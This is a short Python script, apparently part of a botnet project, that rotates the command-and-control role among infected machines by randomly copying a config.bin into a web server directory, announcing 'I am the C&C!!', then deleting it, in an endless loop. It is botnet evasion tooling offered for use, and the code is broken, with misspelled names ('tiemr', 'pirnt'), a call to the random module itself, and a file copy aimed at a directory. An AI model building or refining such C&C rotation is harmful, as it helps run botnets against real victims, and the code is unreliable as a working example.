###	 CODE TO DISSIPATE TRAFFIC IN BOTNET NETWORK	###
import os 
import random
from shutil import copyfile
import time

dummy="/home/desktop/config.bin"	## Duplicate copy of config.bin
original="/bin/lampp/htdocs/"		## Original location as in config.txt during building
n=3									## Number of servers

def main():
	rand = random.randint(0,999)
	if rand%n==0: 					## Change Remainder from 0 to n-1 in each computer
		copyfile(dummy, original)
		timer= random (100,400)		## Choose the intervals the a C&C can be active in a session 	
		time.sleep(tiemr)				
		print "I am the C&C!!" 
		filename=original+"config.bin"
		os.remove(filename)
		pirnt "DONE!! Some other Machine"

	else:
		time.sleep(300)				


if __name__ == '__main__':
	var=1
	while var == 1:					## Infinete loop
		main()